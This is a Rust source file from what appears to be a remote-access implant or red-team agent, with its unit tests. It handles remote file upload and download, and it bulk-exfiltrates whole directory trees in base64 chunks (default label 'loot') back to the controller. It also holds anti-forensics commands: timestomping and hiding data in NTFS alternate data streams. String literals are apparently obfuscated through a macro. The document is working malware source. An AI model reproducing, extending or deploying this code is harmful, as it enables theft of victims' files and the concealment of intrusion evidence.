// src/agent/handlers/files.rs — File operations, directory listing, artifacts
//
// FIXES (2025-07-13):
//   • handle_file_download_chunked  – all blocking file I/O moved into
//     tokio::task::spawn_blocking so the async runtime never stalls.
//   • handle_recursive_download    – same spawn_blocking fix plus:
//       – chunk size reduced from 8 MB → 2 MB to bound memory per chunk
//       – cooperative thread-yield between chunks and every 5 files
//       – uses tokio::sync::mpsc::Sender::blocking_send() from the
//         blocking pool so back-pressure applies without deadlocking.

use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

use crate::common::CommandResponse;
use crate::file_transfer;
use crate::agent::artifacts;
use crate::lc;
use super::{HandlerContext, DispatchResult, AgentAction, wrap_result};

// ── File Read / Write ──────────────────────────────────────────────────

pub fn handle_file_write(cmd: &str) -> (String, String, i32) {
    // Wire format: file:write|<base_dir>|<rel_path>|<b64_data>
    let parts: Vec<&str> = cmd.splitn(4, '|').collect();
    if parts.len() == 4 {
        match file_transfer::write_file_simple(parts[1], parts[2], parts[3]) {
            Ok(_) => (format!("{}: {}/{}", lc!("File written"), parts[1], parts[2]), String::new(), 0),
            Err(e) => (String::new(), e, 1),
        }
    } else { (String::new(), lc!("Usage: file:write|base_dir|rel_path|b64_data"), 1) }
}

/// Chunked file write — receives one piece of a file and appends it to disk.
///
/// Wire format (6 pipe-separated fields):
///   file:write_chunk|<batch_ts>|<path>|<chunk_idx>|<total_chunks>|<b64_data>
///
/// chunk_idx == 0 → create / truncate the file (first chunk)
/// chunk_idx > 0  → append to the existing file
///
/// The agent never holds more than one decoded chunk (~8 MB) in memory at once,
/// matching the download path's per-chunk memory budget.
pub fn handle_file_write_chunked(cmd: &str) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.splitn(6, '|').collect();
    if parts.len() < 6 {
        return (String::new(),
            lc!("Usage: file:write_chunk|batch|path|chunk_idx|total_chunks|b64"), 1);
    }

    let path      = parts[2];
    let chunk_idx: u64 = parts[3].parse().unwrap_or(0);
    let total: u64     = parts[4].parse().unwrap_or(1);
    let b64       = parts[5];

    let bytes = match BASE64.decode(b64) {
        Ok(b)  => b,
        Err(e) => return (String::new(), format!("{}: {}", lc!("Base64 error"), e), 1),
    };

    // Ensure parent directories exist (mirrors write_file_simple behaviour).
    if let Some(parent) = std::path::Path::new(path).parent() {
        if let Err(e) = std::fs::create_dir_all(parent) {
            return (String::new(), e.to_string(), 1);
        }
    }

    use std::io::Write as _;
    let mut file = if chunk_idx == 0 {
        // First chunk: create or overwrite.
        match std::fs::File::create(path) {
            Ok(f)  => f,
            Err(e) => return (String::new(), e.to_string(), 1),
        }
    } else {
        // Later chunks: append to what was already written.
        match std::fs::OpenOptions::new().append(true).open(path) {
            Ok(f)  => f,
            Err(e) => return (String::new(), e.to_string(), 1),
        }
    };

    if let Err(e) = file.write_all(&bytes) {
        return (String::new(), e.to_string(), 1);
    }

    let is_final = chunk_idx + 1 >= total;
    if is_final {
        (format!("[+] {} {}", lc!("Upload complete:"), path), String::new(), 0)
    } else {
        (format!("[*] {}/{} {}", chunk_idx + 1, total, path), String::new(), 0)
    }
}

pub fn handle_file_read(cmd: &str) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.splitn(2, '|').collect();
    if parts.len() == 2 {
        match file_transfer::read_file_to_b64(parts[1]) {
            Ok((b64, perms)) => (format!("file:data|{}|{}|{}", parts[1], perms, b64), String::new(), 0),
            Err(e) => (String::new(), e, 1),
        }
    } else { (String::new(), lc!("Read error"), 1) }
}

// ── Chunked single-file download (>= 50 MB) ────────────────────────────
//
// All blocking file I/O runs inside tokio::task::spawn_blocking so the
// async runtime's worker threads remain free to service HTTP polls and
// timer events.

pub async fn handle_file_download_chunked(ctx: &HandlerContext, cmd: &str, req_id: u64) {
    let path = match cmd.strip_prefix(&lc!("file:read|")) {
        Some(p) if !p.is_empty() => p.to_string(),
        _ => return,
    };
    let tx = ctx.tx.clone();

    tokio::spawn(async move {
        const CHUNK_SIZE: u64 = 8 * 1024 * 1024;
        const CHUNK_SLEEP_MS: u64 = 50;

        let batch_ts = chrono::Utc::now().format("%Y%d%m_%H%M%S_%3f").to_string();

        let root_name = std::path::Path::new(&path)
            .parent()
            .and_then(|p| p.file_name())
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_else(|| "loot".to_string());

        let rel_path = path
            .trim_start_matches('/')
            .trim_start_matches('\\')
            .replace('\\', "/");

        // ── 1. Blocking I/O worker ─────────────────────────────────────
        //    Uses a Tokio mpsc channel with blocking_send() to push
        //    chunks back to the async forwarder without ever touching
        //    the async runtime from the blocking thread.
        let (chunk_tx, mut chunk_rx) = tokio::sync::mpsc::channel::<Vec<u8>>(16);

        let worker = tokio::task::spawn_blocking(move || {
            use std::io::Read as _;

            let file_size: u64 = match std::fs::metadata(&path) {
                Ok(m) => m.len(),
                Err(e) => {
                    let resp = CommandResponse {
                        request_id: req_id, output: String::new(),
                        error: format!("Cannot stat {}: {}", path, e), exit_code: 1,
                    };
                    if let Ok(j) = serde_json::to_vec(&resp) {
                        let _ = chunk_tx.blocking_send(j);
                    }
                    return;
                }
            };

            let total_chunks: u64 = if file_size == 0 { 1 }
                                     else { (file_size + CHUNK_SIZE - 1) / CHUNK_SIZE };

            let mut file = match std::fs::File::open(&path) {
                Ok(f) => f,
                Err(e) => {
                    let resp = CommandResponse {
                        request_id: req_id, output: String::new(),
                        error: format!("Cannot open {}: {}", path, e), exit_code: 1,
                    };
                    if let Ok(j) = serde_json::to_vec(&resp) {
                        let _ = chunk_tx.blocking_send(j);
                    }
                    return;
                }
            };

            let mut chunk_buf = vec![0u8; CHUNK_SIZE as usize];
            let mut chunk_idx: u64 = 0;

            loop {
                let mut total_read = 0usize;
                loop {
                    match file.read(&mut chunk_buf[total_read..]) {
                        Ok(0) => break,
                        Ok(n) => {
                            total_read += n;
                            if total_read == CHUNK_SIZE as usize { break; }
                        }
                        Err(e) => {
                            let resp = CommandResponse {
                                request_id: req_id, output: String::new(),
                                error: format!("Read error (chunk {}): {}", chunk_idx, e),
                                exit_code: 1,
                            };
                            if let Ok(j) = serde_json::to_vec(&resp) {
                                let _ = chunk_tx.blocking_send(j);
                            }
                            return;
                        }
                    }
                }

                let is_last = total_read < CHUNK_SIZE as usize;

                let b64 = BASE64.encode(&chunk_buf[..total_read]);
                let output = format!("file:chunk|{}|{}|{}|{}|{}|{}",
                    batch_ts, root_name, rel_path, chunk_idx, total_chunks, b64);
                let resp = CommandResponse {
                    request_id: req_id, output,
                    error: String::new(), exit_code: 0,
                };
                if let Ok(j) = serde_json::to_vec(&resp) {
                    if chunk_tx.blocking_send(j).is_err() { return; }
                }

                chunk_idx += 1;
                if !is_last {
                    std::thread::sleep(std::time::Duration::from_millis(CHUNK_SLEEP_MS));
                }
                if is_last || file_size == 0 { break; }
            }

            let mb = file_size as f64 / (1024.0 * 1024.0);
            let done = format!(
                "[+] Chunked download complete: {}  ({:.1} MB, {} chunk{})  batch={}",
                path, mb, chunk_idx,
                if chunk_idx == 1 { "" } else { "s" },
                batch_ts,
            );
            let resp = CommandResponse {
                request_id: req_id, output: done,
                error: String::new(), exit_code: 0,
            };
            if let Ok(j) = serde_json::to_vec(&resp) {
                let _ = chunk_tx.blocking_send(j);
            }
        });

        // ── 2. Async forwarder ─────────────────────────────────────────
        //    Drains the internal channel and pushes to the HTTP tx.
        while let Some(data) = chunk_rx.recv().await {
            if tx.send(data).await.is_err() { break; }
        }

        // Propagate any panic in the blocking worker so we don't hide bugs.
        let _ = worker.await;
    });
}

// ── Recursive directory download ───────────────────────────────────────
//
// CRITICAL: this path handles directories with 100 000+ files.  Every
// blocking syscall (read_dir, open, read) now lives inside
// spawn_blocking.  A bounded Tokio channel (capacity 16) applies
// back-pressure so the agent does not OOM when the server is slow.

pub async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: u64) {
    let parts: Vec<&str> = cmd.splitn(2, '|').collect();
    if parts.len() != 2 { return; }
    let root_path = parts[1].to_string();
    let tx = ctx.tx.clone();

    tokio::spawn(async move {
        const CHUNK_SIZE: u64 = 2 * 1024 * 1024;   // 2 MB (was 8 MB)
        const CHUNK_SLEEP_MS: u64 = 20;             // 20 ms between chunks
        const FILES_PER_YIELD: usize = 5;           // yield every N files

        let batch_ts = chrono::Utc::now().format("%Y%d%m_%H%M%S_%3f").to_string();
        let root_name = std::path::Path::new(&root_path)
            .file_name().unwrap_or_default().to_string_lossy().to_string();

        let root_path_fwd  = root_path.replace('\\', "/");
        let root_prefix = std::path::Path::new(&root_path_fwd)
            .parent()
            .map(|p| format!("{}/", p.to_string_lossy()))
            .unwrap_or_default();

        // Bounded channel: 16 slots × ~2.7 MB avg chunk = ~43 MB max buffer.
        let (chunk_tx, mut chunk_rx) = tokio::sync::mpsc::channel::<Vec<u8>>(16);

        // ── Blocking worker: enumeration + reads ─────────────────────
        let worker = tokio::task::spawn_blocking(move || {
            use std::io::Read as _;

            // 1. Enumerate (blocking call — may take seconds on huge trees).
            let (files, _errors) = file_transfer::find_all_files(&root_path);

            let mut report = file_transfer::RecursiveReport {
                root_path: root_path.clone(),
                total_files_found: files.len(),
                total_success: 0,
                failed_downloads: Vec::new(),
            };

            for (file_idx, path) in files.iter().enumerate() {
                let path_str = path.to_string_lossy().replace('\\', "/");
                let rel_path = if path_str.starts_with(&root_prefix) {
                    path_str[root_prefix.len()..].to_string()
                } else {
                    path_str.clone()
                };

                // 2. Stat + open (both blocking).
                let file_size: u64 = match std::fs::metadata(&path_str) {
                    Ok(m) => m.len(),
                    Err(e) => {
                        report.failed_downloads.push((path_str, e.to_string()));
                        continue;
                    }
                };

                let total_chunks: u64 = if file_size == 0 { 1 }
                    else { (file_size + CHUNK_SIZE - 1) / CHUNK_SIZE };

                let mut file = match std::fs::File::open(&path_str) {
                    Ok(f) => f,
                    Err(e) => {
                        report.failed_downloads.push((path_str, e.to_string()));
                        continue;
                    }
                };

                let mut chunk_buf = vec![0u8; CHUNK_SIZE as usize];
                let mut chunk_idx: u64 = 0;
                let mut file_ok = true;

                loop {
                    let mut total_read = 0usize;
                    loop {
                        match file.read(&mut chunk_buf[total_read..]) {
                            Ok(0) => break,
                            Ok(n) => {
                                total_read += n;
                                if total_read == CHUNK_SIZE as usize { break; }
                            }
                            Err(e) => {
                                report.failed_downloads.push((path_str.clone(), e.to_string()));
                                file_ok = false;
                                break;
                            }
                        }
                    }
                    if !file_ok { break; }

                    let is_last = total_read < CHUNK_SIZE as usize;
                    let actual_total = if file_size == 0 { 1u64 } else { total_chunks };

                    let b64 = base64::engine::general_purpose::STANDARD
                        .encode(&chunk_buf[..total_read]);
                    let output = format!("file:chunk|{}|{}|{}|{}|{}|{}",
                        batch_ts, root_name, rel_path, chunk_idx, actual_total, b64);
                    let resp = CommandResponse {
                        request_id: req_id, output,
                        error: String::new(), exit_code: 0
                    };
                    if let Ok(j) = serde_json::to_vec(&resp) {
                        if chunk_tx.blocking_send(j).is_err() { return; }
                    }

                    chunk_idx += 1;

                    // Cooperative yield: sleep so other OS threads can run.
                    if !is_last {
                        std::thread::sleep(std::time::Duration::from_millis(CHUNK_SLEEP_MS));
                    }
                    if is_last || file_size == 0 { break; }
                }

                if file_ok { report.total_success += 1; }

                // Yield every N files to keep enumeration from monopolising
                // the blocking pool thread for too long.
                if (file_idx + 1) % FILES_PER_YIELD == 0 {
                    std::thread::sleep(std::time::Duration::from_millis(1));
                }
            }

            // 3. Send final report.
            let rep_json = serde_json::to_string(&report).unwrap_or_default();
            let final_out = format!("file:report_batch|{}|{}|{}", batch_ts, root_name, rep_json);
            let resp = CommandResponse {
                request_id: req_id, output: final_out,
                error: String::new(), exit_code: 0
            };
            if let Ok(j) = serde_json::to_vec(&resp) {
                let _ = chunk_tx.blocking_send(j);
            }
        });

        // ── Async forwarder ──────────────────────────────────────────
        while let Some(data) = chunk_rx.recv().await {
            if tx.send(data).await.is_err() { break; }
        }

        let _ = worker.await;
    });
}

// ── Artifacts (timestomp, secure_delete, ADS) ──────────────────────────

pub fn handle_timestomp(cmd: &str) -> DispatchResult {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() != 3 {
        return DispatchResult::Reply(String::new(), lc!("Usage: timestomp <target> <reference_file>"), 1, AgentAction::None);
    }
    wrap_result(artifacts::timestomp_copy(parts[1], parts[2]))
}

pub fn handle_timestomp_set(cmd: &str) -> DispatchResult {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() != 3 {
        return DispatchResult::Reply(String::new(), lc!("Usage: timestomp:set <path> <unix_epoch>"), 1, AgentAction::None);
    }
    match parts[2].parse::<i64>() {
        Ok(epoch) => wrap_result(artifacts::timestomp_epoch(parts[1], epoch)),
        Err(_) => DispatchResult::Reply(String::new(), lc!("Invalid epoch timestamp"), 1, AgentAction::None),
    }
}

pub fn handle_ads_write(cmd: &str) -> DispatchResult {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() != 4 {
        return DispatchResult::Reply(String::new(), lc!("Usage: ads:write <path> <stream_name> <b64_data>"), 1, AgentAction::None);
    }
    match BASE64.decode(parts[3]) {
        Ok(data) => wrap_result(artifacts::ads_write(parts[1], parts[2], &data)),
        Err(_) => DispatchResult::Reply(String::new(), lc!("Invalid base64"), 1, AgentAction::None),
    }
}

pub fn handle_ads_read(cmd: &str) -> DispatchResult {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() != 3 {
        return DispatchResult::Reply(String::new(), lc!("Usage: ads:read <path> <stream_name>"), 1, AgentAction::None);
    }
    match artifacts::ads_read(parts[1], parts[2]) {
        Ok(data) => DispatchResult::Reply(BASE64.encode(&data), String::new(), 0, AgentAction::None),
        Err(e) => DispatchResult::Reply(String::new(), e, 1, AgentAction::None),
    }
}

pub fn handle_ads_list(path: &str) -> DispatchResult {
    match artifacts::ads_list(path) {
        Ok(streams) if streams.is_empty() => DispatchResult::Reply(lc!("No alternate data streams found"), String::new(), 0, AgentAction::None),
        Ok(streams) => DispatchResult::Reply(streams.join("\n"), String::new(), 0, AgentAction::None),
        Err(e) => DispatchResult::Reply(String::new(), e, 1, AgentAction::None),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn timestomp_bad_args() {
        match handle_timestomp("timestomp only_one_arg") {
            DispatchResult::Reply(_, err, 1, _) => assert!(err.contains("Usage")),
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn timestomp_set_bad_epoch() {
        match handle_timestomp_set("timestomp:set /tmp/foo not_a_number") {
            DispatchResult::Reply(_, err, 1, _) => assert!(err.contains("epoch")),
            _ => panic!("Expected epoch error"),
        }
    }

    #[test]
    fn ads_write_bad_args() {
        match handle_ads_write("ads:write only two") {
            DispatchResult::Reply(_, err, 1, _) => assert!(err.contains("Usage")),
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn ads_read_bad_args() {
        match handle_ads_read("ads:read only") {
            DispatchResult::Reply(_, err, 1, _) => assert!(err.contains("Usage")),
            _ => panic!("Expected usage error"),
        }
    }

    #[test]
    fn file_write_bad_format() {
        let (_, _, code) = handle_file_write("file:write|no_data");
        assert_eq!(code, 1);
    }

    #[test]
    fn file_read_bad_format() {
        let (_, _, code) = handle_file_read("file:read");
        assert_eq!(code, 1);
    }

    // ── handle_file_write_chunked ─────────────────────────────────────────────

    fn b64(data: &[u8]) -> String {
        BASE64.encode(data)
    }

    /// Build a well-formed file:write_chunk command string.
    fn write_chunk_cmd(path: &str, idx: u64, total: u64, data: &[u8]) -> String {
        format!("file:write_chunk|batch_test|{}|{}|{}|{}", path, idx, total, b64(data))
    }

    #[test]
    fn write_chunked_too_few_fields_returns_error() {
        // Only 4 fields instead of 6
        let (_, err, code) = handle_file_write_chunked("file:write_chunk|batch|path|0");
        assert_eq!(code, 1);
        assert!(err.to_lowercase().contains("usage") || err.to_lowercase().contains("chunk"),
            "expected usage message, got: {}", err);
    }

    #[test]
    fn write_chunked_invalid_base64_returns_error() {
        let (_, err, code) = handle_file_write_chunked(
            "file:write_chunk|batch|/tmp/test_bad_b64|0|1|not!valid!base64!!!"
        );
        assert_eq!(code, 1, "expected exit 1, got 0 with msg: {}", err);
    }

    #[test]
    fn write_chunked_single_chunk_creates_file_with_correct_content() {
        let dir  = tempfile::tempdir().unwrap();
        let path = dir.path().join("single.bin").to_string_lossy().to_string();
        let data = b"hello world";

        let (msg, err, code) = handle_file_write_chunked(&write_chunk_cmd(&path, 0, 1, data));

        assert_eq!(code, 0, "err: {}", err);
        assert!(msg.contains("complete") || msg.contains("Upload"),
            "expected completion message, got: {}", msg);
        assert_eq!(std::fs::read(&path).unwrap(), data);
    }

    #[test]
    fn write_chunked_final_chunk_message_contains_path() {
        let dir  = tempfile::tempdir().unwrap();
        let path = dir.path().join("msg_check.bin").to_string_lossy().to_string();

        // chunk_idx=0, total=3: creates file, NOT final (0+1 < 3)
        let (msg, _, code) = handle_file_write_chunked(&write_chunk_cmd(&path, 0, 3, b"a"));
        assert_eq!(code, 0, "chunk 0 failed");
        assert!(!msg.contains("complete"), "chunk 0/3 should not say complete: {}", msg);

        // chunk_idx=1: appends, NOT final (1+1 < 3)
        let (msg, _, code) = handle_file_write_chunked(&write_chunk_cmd(&path, 1, 3, b"b"));
        assert_eq!(code, 0, "chunk 1 failed");
        assert!(!msg.contains("complete"), "chunk 1/3 should not say complete: {}", msg);

        // chunk_idx=2, total=3: appends, IS final (2+1 == 3)
        let (msg, _, code) = handle_file_write_chunked(&write_chunk_cmd(&path, 2, 3, b"c"));
        assert_eq!(code, 0, "chunk 2 failed");
        assert!(msg.contains("complete") || msg.contains("Upload"),
            "chunk 2/3 (final, 0-indexed) should say complete: {}", msg);
    }

    #[test]
    fn write_chunked_non_final_chunk_shows_progress() {
        let dir  = tempfile::tempdir().unwrap();
        let path = dir.path().join("progress.bin").to_string_lossy().to_string();

        // chunk_idx=0, total=3 → not final
        let (msg, _, code) = handle_file_write_chunked(&write_chunk_cmd(&path, 0, 3, b"a"));
        assert_eq!(code, 0);
        assert!(!msg.contains("complete"),
            "chunk 0 of 3 should NOT say complete: {}", msg);
        // Message should contain the fraction
        assert!(msg.contains("1") && msg.contains("3"),
            "progress message should show '1/3': {}", msg);
    }

    #[test]
    fn write_chunked_first_chunk_truncates_existing_file() {
        let dir  = tempfile::tempdir().unwrap();
        let path = dir.path().join("trunc.bin").to_string_lossy().to_string();

        // Write a large file first
        std::fs::write(&path, b"OLD CONTENT THAT SHOULD BE GONE").unwrap();

        // Send chunk 0 with different content
        let (_, err, code) = handle_file_write_chunked(&write_chunk_cmd(&path, 0, 1, b"NEW"));
        assert_eq!(code, 0, "err: {}", err);
        assert_eq!(std::fs::read(&path).unwrap(), b"NEW",
            "chunk_idx=0 must truncate, not append");
    }

    #[test]
    fn write_chunked_three_chunks_assemble_in_order() {
        let dir  = tempfile::tempdir().unwrap();
        let path = dir.path().join("multipart.bin").to_string_lossy().to_string();

        let parts: &[&[u8]] = &[b"ALPHA", b"BETA", b"GAMMA"];
        for (i, part) in parts.iter().enumerate() {
            let (_, err, code) = handle_file_write_chunked(
                &write_chunk_cmd(&path, i as u64, parts.len() as u64, part)
            );
            assert_eq!(code, 0, "chunk {} failed: {}", i, err);
        }

        assert_eq!(std::fs::read(&path).unwrap(), b"ALPHABETAGAMMA");
    }

    #[test]
    fn write_chunked_binary_data_round_trips_faithfully() {
        let dir  = tempfile::tempdir().unwrap();
        let path = dir.path().join("binary.bin").to_string_lossy().to_string();

        // All 256 byte values — exercises non-UTF-8 content
        let data: Vec<u8> = (0u8..=255).collect();
        let (_, err, code) = handle_file_write_chunked(&write_chunk_cmd(&path, 0, 1, &data));
        assert_eq!(code, 0, "err: {}", err);
        assert_eq!(std::fs::read(&path).unwrap(), data);
    }

    #[test]
    fn write_chunked_creates_missing_parent_directories() {
        let dir   = tempfile::tempdir().unwrap();
        let path  = dir.path()
            .join("deep").join("nested").join("dir").join("file.bin")
            .to_string_lossy().to_string();

        let (_, err, code) = handle_file_write_chunked(&write_chunk_cmd(&path, 0, 1, b"hi"));
        assert_eq!(code, 0, "err: {}", err);
        assert_eq!(std::fs::read(&path).unwrap(), b"hi");
    }

    #[test]
    fn write_chunked_zero_byte_chunk_creates_empty_file() {
        let dir  = tempfile::tempdir().unwrap();
        let path = dir.path().join("empty.bin").to_string_lossy().to_string();

        let (_, err, code) = handle_file_write_chunked(&write_chunk_cmd(&path, 0, 1, b""));
        assert_eq!(code, 0, "err: {}", err);
        assert_eq!(std::fs::read(&path).unwrap(), b"");
    }
}
